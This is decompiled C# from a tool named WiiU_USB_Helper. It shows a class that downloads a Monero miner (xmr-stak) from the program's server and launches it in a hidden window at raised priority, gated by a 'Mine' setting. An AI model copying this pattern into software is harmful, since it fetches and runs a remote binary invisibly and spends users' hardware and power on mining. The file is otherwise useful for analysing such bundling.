// Decompiled with JetBrains decompiler
// Type: ns0.Class108
// Assembly: WiiU_USB_Helper, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 8A8903FC-BD1C-4FCE-9A9B-6F50F8E0D0D6
// Assembly location: C:\0.6.1.655\WiiU_USB_Helper-cleaned.exe

using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.IO;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Telerik.WinControls;
using WIIU_Downloader;
using WIIU_Downloader.Properties;

namespace ns0
{
  internal static class Class108
  {
    public static bool bool_0;
    private static MinerPofile minerPofile_0;
    private static volatile bool bool_1;
    private static Process process_0;
    private static volatile bool bool_2;

    public static bool Boolean_0
    {
      get
      {
        return GClass6.smethod_16("xmr-stak");
      }
    }

    public static void smethod_0()
    {
      if (!Settings.Default.Mine)
        return;
      if (!Environment.Is64BitOperatingSystem)
      {
        int num = (int) RadMessageBox.Show("Sorry but you need a 64 bit OS to mine!");
        Settings.Default.Mine = false;
        Settings.Default.Save();
      }
      else
      {
        if (Class108.Boolean_0)
          return;
        Class108.bool_2 = true;
        try
        {
          Task.Run((Action) (() =>
          {
            string str1 = Path.Combine(GClass88.CachePath, "miner");
            Directory.CreateDirectory(str1);
            string str2 = Path.Combine(str1, "xmr-stak.exe");
            string str3 = Path.Combine(str1, "nvidia.txt");
            string str4 = Path.Combine(str1, "amd.txt");
            string contents1 = "\"gpu_threads_conf\" : null,";
            string contents2 = contents1 + "\"platform_index\" : 0,";
            GClass126 gclass126 = GClass126.smethod_0(Class108.minerPofile_0);
            if (gclass126.UseGpu && SystemInformation.PowerStatus.BatteryChargeStatus == BatteryChargeStatus.NoSystemBattery)
            {
              GClass6.smethod_6(str3);
              GClass6.smethod_6(str4);
            }
            else
            {
              File.WriteAllText(str3, contents1);
              File.WriteAllText(str4, contents2);
            }
            string str5 = "\"cpu_threads_conf\" : [";
            for (int index = 0; index < gclass126.ThreadCount; ++index)
              str5 += string.Format("{{ \"low_power_mode\" : 0, \"no_prefetch\" : true, \"affine_to_cpu\" :{0} }},", (object) index);
            string contents3 = str5 + "],";
            string path = Path.Combine(str1, "etag");
            string contents4 = GClass6.smethod_14(string.Format("{0}/mining/miner_gpu.zip", (object) Class67.String_2));
            if (!File.Exists(path) || contents4 != File.ReadAllText(path))
            {
              Class108.bool_0 = true;
              GClass6.smethod_8(string.Format("{0}/mining/miner_gpu.zip", (object) Class67.String_2), str1);
              File.WriteAllText(path, contents4);
              Class108.bool_0 = false;
            }
            bool flag = false;
            try
            {
              flag = Class108.smethod_3();
            }
            catch
            {
            }
            if (!flag)
              File.WriteAllText(Path.Combine(str1, "config.txt"), File.ReadAllText(Path.Combine(str1, "config.txt")).Replace("\"use_slow_memory\" : \"warn\"", "\"use_slow_memory\" : \"always\""));
            File.WriteAllText(Path.Combine(str1, "cpu.txt"), contents3);
            try
            {
              // ISSUE: object of a compiler-generated type is created
              // ISSUE: variable of a compiler-generated type
              Class108.Class109 class109 = new Class108.Class109();
              // ISSUE: reference to a compiler-generated field
              class109.process_0 = new Process()
              {
                StartInfo = new ProcessStartInfo()
                {
                  FileName = str2,
                  UseShellExecute = true,
                  WindowStyle = ProcessWindowStyle.Hidden,
                  WorkingDirectory = str1
                }
              };
              // ISSUE: reference to a compiler-generated field
              class109.process_0.EnableRaisingEvents = true;
              // ISSUE: reference to a compiler-generated field
              // ISSUE: reference to a compiler-generated method
              class109.process_0.Exited += new EventHandler(class109.method_0);
              // ISSUE: reference to a compiler-generated field
              class109.process_0.Start();
              // ISSUE: reference to a compiler-generated field
              class109.process_0.PriorityClass = Class108.minerPofile_0 == MinerPofile.IDLE ? ProcessPriorityClass.BelowNormal : ProcessPriorityClass.High;
              Settings.Default.Mine = true;
              Settings.Default.Save();
              if (Class108.bool_1)
                return;
              Class108.bool_1 = true;
              Task.Run((Func<Task>) (() =>
              {
                while (true)
                {
                  MinerPofile minerPofile0 = GClass126.MinerPofile_0;
                  if (minerPofile0 != Class108.minerPofile_0 && Class108.Boolean_0)
                    goto label_2;
label_1:
                  Thread.Sleep(2000);
                  continue;
label_2:
                  Console.WriteLine("Switched to profile :" + Enum.GetName(typeof (MinerPofile), (object) minerPofile0));
                  Class108.smethod_1();
                  Thread.Sleep(2000);
                  Class108.minerPofile_0 = minerPofile0;
                  Class108.smethod_0();
                  goto label_1;
                }
              }));
            }
            catch
            {
            }
          }));
        }
        catch
        {
        }
      }
    }

    public static void smethod_1()
    {
      try
      {
        Class108.bool_2 = false;
        Process process0 = Class108.process_0;
        if (process0 != null)
          process0.Kill();
        foreach (Process process in Process.GetProcessesByName("xmr-stak"))
          process.Kill();
      }
      catch
      {
      }
    }

    private static bool smethod_2(string string_0)
    {
      return ((string) Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion").GetValue("ProductName")).Contains(string_0);
    }

    private static bool smethod_3()
    {
      return Class108.smethod_2("Windows 10");
    }
  }
}
